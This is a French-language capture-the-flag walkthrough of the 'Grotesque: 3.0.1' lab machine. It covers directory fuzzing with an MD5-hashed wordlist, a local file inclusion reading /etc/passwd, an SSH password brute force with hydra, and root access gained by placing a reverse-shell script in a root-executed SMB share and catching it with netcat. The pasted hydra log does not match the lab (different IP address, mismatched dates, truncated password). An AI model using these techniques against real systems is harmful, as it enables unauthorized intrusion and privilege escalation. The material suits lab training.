# Grotesque：3.0.1
## Résume :
Cette machine cible implique principalement une seule vulnérabilité, le **LFI**, mais se concentre principalement sur la collecte d'informations.

1. Collecte d'informations
2. Scan des répertoires avec gobuster
3. Utilisation de wfuzz
4. Exploitation de la vulnérabilité LFI
5. Brute force SSH avec hydra
6. Utilisation de smbclient
7. Utilisation de linpeas.sh et pspy64
8. Exploitation des tâches planifiées


## Test d'intrusion
1. Démarrer la machine virtuelle et scanner d'adresses

```bash
arp-scan -l eth0 -l
```
![请添加图片描述](https://i-blog.csdnimg.cn/direct/8907f88df8a54a649b52c88367a8f89a.png)
mon adresse :10.1.12.109
l'adress de la machine :10.1.12.130

2. Vérifier les ports ouverts de la machine virtuelle.

```bash
nmap -sC -sV -p- 10.1.12.130
```

3. Accéder à l'adresse IP 10.1.12.130.

![请添加图片描述](https://i-blog.csdnimg.cn/direct/43902e478bc44888b23a99680a04c9b2.png)
En cliquant pour voir, nous pouvons obtenir une image.
![请添加图片描述](https://i-blog.csdnimg.cn/direct/fc39aa42e5474488a04e9c36d0adb38f.png)

4. Nous commençons par utiliser Gobuster pour effectuer un scan de dictionnaire.

```bash
gobuster dir -u http://10.1.12.130 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -x php,html,txt,zip

```
![请添加图片描述](https://i-blog.csdnimg.cn/direct/5e89f69ab69f43f9b4192d2b803555c1.png)

D'après les résultats, il n'y a aucune information utile. Nous envisageons la possibilité qu'il y ait un dictionnaire caché.

5. En agrandissant, on obtient le hash MD5, qui est une méthode de hachage utilisée dans les dictionnaires 
![请添加图片描述](https://i-blog.csdnimg.cn/direct/e44e70be76ed4109b197d97f42cefc63.png)
Nous allons créer un dictionnaire crypté en MD5.

```bash
for i in $(cat /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt);do echo $i | md5sum >> dir.txt;done
```
![请添加图片描述](https://i-blog.csdnimg.cn/direct/23ddf08f811041aaa43f6aab922500de.png)
Supprimer les tirets et les espaces.

![请添加图片描述](https://i-blog.csdnimg.cn/direct/7bbf4902602e45999811e617d60a9b7a.png)

6. Scanner deuxème fois la ficher dir.txt qui crypté par md5 .


7. 
Nous avons réussi à obtenir le nouveau répertoire `/f66b22bf020334b04c7d0d3eb5010391.php`. En visitant l'adresse `http://10.1.12.130/f66b22bf020334b04c7d0d3eb5010391.php`, cependant, la page est blanche et le code source est également vide.
Nous envisageons d'utiliser fuff pour une détection de fuzzing.

```bash
fuff -c -u http://10.1.12.130/f66b22bf020334b04c7d0d3eb5010391.php?FUZZ=/etc/passwd -w /usr/share/wordlists/rockyou.txt -fs 0
```
![请添加图片描述](https://i-blog.csdnimg.cn/direct/2cfa5e44a6ac47019028b22fcb0a7a58.png)
Nous avons obtenu le mot-clé "**purpose**".

## L'exploitation de vulnérabilités
1. Visiter l’address :`http://10.1.12.130/f66b22bf020334b04c7d0d3eb5010391.php?purpose=/etc/passwd` et regarder son ressource .
![请添加图片描述](https://i-blog.csdnimg.cn/direct/10bc386c0a23473791880c672b11f596.png)
L'utilisateur **freddie** a un UID et un GID tous deux égaux à **1000**, ce qui correspond à un ID utilisateur normal. Cependant, son shell est défini à **/bin/bash**, indiquant qu'il a un accès normal au shell, contrairement à de nombreux utilisateurs système qui sont restreints (comme **/usr/sbin/nologin** ou **/bin/false**).
Donc, nous concluons que l'utilisateur **freddie** a des privilèges élevés.

2. Nous essayons de nous connecter en utilisant SSH avec l'utilisateur freddie.
En ce moment ,on a besion son mots de pass.On essaye de regarder son **id_rsa**

```html
http://10.1.12.130/f66b22bf020334b04c7d0d3eb5010391.php?purpose=/home/freddie/.ssh/id_rsa
```
et 

```html
http://10.1.12.130/f66b22bf020334b04c7d0d3eb5010391.php?purpose=/home/freddie/.ssh/id_rsa.pub
```
les pages sont blanche,on essaye de faire du bruteforcing de mot de passe.

```bash
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-20 23:22:34
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 220560 login tries (l:1/p:220560), ~13785 tries per task
[DATA] attacking ssh://192.168.1.49:22/
[STATUS] 142.00 tries/min, 142 tries in 00:01h, 220420 to do in 25:53h, 14 active
[STATUS] 98.67 tries/min, 296 tries in 00:03h, 220266 to do in 37:13h, 14 active
[STATUS] 92.29 tries/min, 646 tries in 00:07h, 219916 to do in 39:43h, 14 active
[STATUS] 2.39 tries/min, 675 tries in 04:42h, 219887 to do in 1535:47h, 14 active
[STATUS] 7.03 tries/min, 2101 tries in 04:58h, 218461 to do in 517:57h, 14 active
[22][ssh] host: 192.168.1.49   login: freddie   password: 61a4e3e60c063d1e472dd780f64e6cad
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-07-20 23:24:23

```
on a obtenu son mot de pass **61a4e3e60c063d1e472**

3. Essayee de log in avec **freddie** et **61a4e3e60c063d1e472**

```bash
ssh freddie@10.1.12.130
```

![请添加图片描述](https://i-blog.csdnimg.cn/direct/c5ce1e44fb714234986f7af5dc5810ba.png)
## L'élévation des privilèges
1.Collecte d'informations

```bash
freddie@grotesque:~$ ls
user.txt
freddie@grotesque:~$ cat user.txt
35A7EB682E33E89606102A883596A880freddie@grotesque:~$ 
```
le premier flag

2. Essayer l'élévation des privilèges

```bash
freddie@grotesque:~$ find / -perm -u=s -type f 2>/dev/null 
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chfn
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/chsh
freddie@grotesque:~$ sudo -l
-bash: sudo: command not found

```
3. 
```bash
ss -tulpn 
```

permet de voir quels ports sont ouverts par l'utilisateur.

```bash
freddie@grotesque:~$ ss -tulpn
Netid            State             Recv-Q            Send-Q                       Local Address:Port                        Peer Address:Port            
udp              UNCONN            0                 0                                  0.0.0.0:68                               0.0.0.0:*               
udp              UNCONN            0                 0                              10.1.13.255:137                              0.0.0.0:*               
udp              UNCONN            0                 0                              10.1.12.130:137                              0.0.0.0:*               
udp              UNCONN            0                 0                                  0.0.0.0:137                              0.0.0.0:*               
udp              UNCONN            0                 0                              10.1.13.255:138                              0.0.0.0:*               
udp              UNCONN            0                 0                              10.1.12.130:138                              0.0.0.0:*               
udp              UNCONN            0                 0                                  0.0.0.0:138                              0.0.0.0:*               
tcp              LISTEN            0                 50                                 0.0.0.0:139                              0.0.0.0:*               
tcp              LISTEN            0                 128                                0.0.0.0:22                               0.0.0.0:*               
tcp              LISTEN            0                 50                                 0.0.0.0:445                              0.0.0.0:*               
tcp              LISTEN            0                 50                                    [::]:139                                 [::]:*               
tcp              LISTEN            0                 128                                      *:80                                     *:*               
tcp              LISTEN            0                 50                                    [::]:445                                 [::]:*      
```
**0.0.0.0:22** : indique que le service **SSH** écoute sur le port 22 de toutes les interfaces réseau.
***. :80** : indique que le service **Web** écoute sur le port 80.
**::]:445** : indique que le service **SMB** écoute sur le port 445.

4. Car il existe le service SMB sur la porte 445,on prends `smbclient` pour regarder les infos partagées .

```bash
smbclient -L 127.0.0.1
```

```bash
freddie@grotesque:~$ smbclient -L 127.0.0.1
Unable to initialize messaging context
Enter WORKGROUP\freddie's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        grotesque       Disk      grotesque
        IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            GROTESQUE

```
5. Obtenir un dossier partagé  **grotesque**
 `smbclient //127.0.0.1/grotesque` pour regarder .
 

```bash
freddie@grotesque:~$ smbclient //127.0.0.1/grotesque
Unable to initialize messaging context
Enter WORKGROUP\freddie's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jul 11 09:24:27 2021
  ..                                  D        0  Sun Jul 11 09:20:30 2021

                1942736 blocks of size 1024. 674116 blocks available

```
mais y a rien info pratique .

5. Téléchargez un autre **pspy64** pour voir s'il y a des tâches planifiées
(Ouvrez un nouveau port de terminal et entrez dans le répertoire psy64)

```bash
scp pspy64 freddie@10.1.12.130:~
```

Revenir à la terminal de de connexion ssh freedie.

```bash
ls
./psy
```
![请添加图片描述](https://i-blog.csdnimg.cn/direct/133b19f0eb2b462ab91ceb82dc72ca48.png) 
**bash/smbshare/***
J'ai découvert que le root exécute tout le contenu du dossier /smbshare. 

En vérifiant, j'ai vu que je n'avais pas les permissions pour accéder à ce dossier.

6. Vous pouvez télécharger un shell de rebond shell.sh dans ce dossier et exécuter ce shell de rebond via une tâche planifiée pour obtenir les autorisations root.(comme psy64)

```bash
scp shell.sh freddie@10.1.12.130:~  
```

7. Et puis entrer smb,

```bash
freddie@grotesque:~$ cd /tmp
freddie@grotesque:/tmp$ ls
linpeas.sh
shell.sh
systemd-private-966b61c4a3bf42889528302ace12acd2-apache2.service-Gybmaq
systemd-private-966b61c4a3bf42889528302ace12acd2-systemd-timesyncd.service-2EzUsP
freddie@grotesque:/tmp$  smbclient  //127.0.0.1/grotesque
Unable to initialize messaging context
Enter WORKGROUP\freddie's password: 
Try "help" to get a list of possible commands.
smb: \> put shell.sh
putting file shell.sh as \shell.sh (0.8 kb/s) (average 0.8 kb/s)
smb: \> ls

```

8. Puis surveillez nc -lvp 6666 dans Kali

```bash
⬢  Grotesque: 3.0.1  nc -lvp 6666                    
listening on [any] 6666 ...
Warning: forward host lookup failed for bogon: Unknown host
connect to [10.1.12.130] from bogon [10.1.12.130] 40334
sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls
root.txt
# cat root.txt  
5C42D6BB0EE9CE4CB7E7349652C45C4A# 

```
Obtention réussie des autorisations root et obtention de flag2 !
